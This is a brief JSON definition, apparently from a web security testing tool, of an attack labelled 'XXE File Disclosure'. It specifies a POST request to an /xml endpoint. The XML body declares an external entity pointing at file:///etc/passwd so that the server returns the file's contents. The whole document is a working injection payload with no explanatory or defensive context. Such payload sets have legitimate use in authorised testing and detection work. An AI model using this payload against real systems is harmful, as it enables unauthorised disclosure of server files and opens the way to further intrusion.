{
    "name": "XXE File Disclosure",
    "description": "Inject XXE to read local files",
    "method": "POST",
    "endpoint": "/xml",
    "headers": {
        "Content-Type": "application/xml"
    },
    "parameters": {
        "xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><data>&xxe;</data>"
    }
}